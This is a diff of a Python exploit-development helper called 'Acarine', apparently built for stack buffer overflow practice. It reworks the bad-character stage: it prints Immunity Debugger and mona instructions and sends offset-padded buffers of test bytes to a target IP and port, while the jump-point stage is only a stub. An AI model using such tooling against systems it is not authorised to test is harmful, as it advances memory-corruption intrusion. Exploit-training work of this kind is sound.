@@ -1,6 +1,6 @@
 #!/bin/python
 
-# Acarine v0.3.2
+# Acarine v0.4.0
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
@@ -189,36 +189,50 @@ def offsetEnter():
         offsetEnter()
 
 def charsMod(charsResultInput):
-    global badCharsMod
-    chars_chars_mod = badChars
-    inp = charsResultInput.split()
-    for i in inp:
-        chars_chars_mod = chars_chars_mod.replace(f"{i}\\x","")
-    badCharsMod = chars_chars_mod.split("\\x")
-    badCharsMod = "".join(
-        chr(int(i,16))
-        for i in badCharsMod if i 
-        )
-    return badCharsMod
+    global badChars
+    toRemove = charsResultInput.split(' ')
+    toRemove = list(r'\x' + toRemove for toRemove in toRemove)
+    for match in toRemove:
+        badChars = badChars.replace(match, '')
+    return badChars
 
-def badCharsExec(charsResultInput):
-    global badCharsLoad
+def charsPrompt(charsResultInput):
     menuCheck(charsResultInput)
-    charsMod(charsResultInput)
-    badCharsLoad = "A" * offset + "B" * 4 + badCharsMod
+    if charsResultInput == "":
+        return badChars
+    else:
+        charsMod(charsResultInput)
+
+def charsConvert(charsResultInput):
+    chars_chars_mod = badChars
+    arr = chars_chars_mod.split("\\x")
+    arr = "".join(
+        chr(int(i,16))
+        for i in arr if i
+        )
+    badCharsLoad = "A" * offset + "B" * 4 + arr
     bufferSend(badCharsLoad)
+    # return arr
+
+def badCharsExec(charInp):
+    charsPrompt(charInp)
+    charsConvert(badChars)
 
 def badCharsTest():
+    ## Instructions/Intro - Explains BadChars
     print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n
 In this section we will be generating a series of characters that will use to diagnose whether the program
 we are testing has any {color.BOLD}Bad Characters{color.END} that need to be eliminated before generating an exploit.""")
-    offsetAvailble() # Tests to see if EIP offset variable already has a value, if not offsetEnter() gets from User.
+    offsetAvailble()
+    ## Tells how to make first byte array
     print(f"\nFirst we need to generate a byte array. This will be used to determine any Bad Characters.\n")
     print(rf'To generate a byte array in Immunity enter "{color.YELLOW}!mona bytearray -b "\x00"{color.END}"')
     print("""\nAgain, make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n
 When ready, a payload of characters will be sent to the target program.\n""")
-    charsResultInput = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
-    badCharsExec(charsResultInput)
+    ## Test 1: w/o user input:
+    charsInitialInput = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
+    badCharsExec(charsInitialInput)
+    ## Tells how to compare and "please note"
     print(f"This time make note of the {color.BOLD}ESP value.{color.END}\n")
     print(rf"And in Immunity enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}'")
     print(f"""\nNow, make note of the characters listed under the 'BadChars' header in the comparison results.\n
@@ -226,21 +240,25 @@ Please note:
     [*] The '00' byte has {color.BOLD}already been excluded{color.END} from the byte array, so {color.BOLD}do not{color.END} enter this as a result.
     [*] If two bytes follow each other (e.g. '0a 0b','19 1a', etc) {color.BOLD}only enter the first byte listed{color.END}, as the second may be a false positive.
         If the second byte continues to show as a positive in subsequent testing, then please include it.\n
-After making note of the bad character(s), make sure you RE-LOAD and RE-RUN your target program before continuing.""")
-    charsResultInput = input(f"\n{color.GREEN}Enter bad characters separated by spaces, and press [ENTER] to continue.\nOR, if 'Status' header returns 'Unmodified' press [ENTER]: {color.END}")
-    badCharsExec(charsResultInput) 
-    print(f"Using the new ESP, enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}'")
-    charsResultInput = input(f"{color.GREEN}If Immunity now lists chars as 'Unmodified' press [ENTER], otherwise enter BadCharacters: {color.END}")
-    if charsResultInput == "":
-        True
-    else:
-        badCharsExec(charsResultInput)
+After making note of the bad character(s), make sure you {color.BOLD}RE-LOAD and RE-RUN{color.END} your target program before continuing.""")
+    # Test 2: w/ user input:
+    charsResultInput = input(f"\n{color.GREEN}Enter bad characters seperated by spaces, and press [ENTER] to continue.\nOR, if 'Status' header returns 'Unmodified' press [ENTER]: {color.END}")
+    badCharsExec(charsResultInput)
+    # Test 3: Asks user to either enter if unmodified or enter badchars:
+    while True:
+        print(rf"Using the new ESP, enter '{color.YELLOW}!mona compare -f C:\mona\{color.END}{color.RED}<PROGRAM>{color.END}{color.YELLOW}\bytearray.bin -a {color.END}{color.RED}<ESP>{color.END}' again.")
+        newCharsResultInput = input(f"\n{color.GREEN}If 'Status' header now returns 'Unmodified' press [ENTER] (or enter remaining BadChars): {color.END}")
+        if newCharsResultInput != "":
+            badCharsExec(newCharsResultInput)
+        elif newCharsResultInput == "":
+            break
     jumpPointTest()
 
 # [4] Finding the Jump Point:
 
 def jumpPointTest():
     print("Jump Point Test")
+    print(badChars)
     sys.exit()
 
 # [5] Final Buffer Overflow Exploit
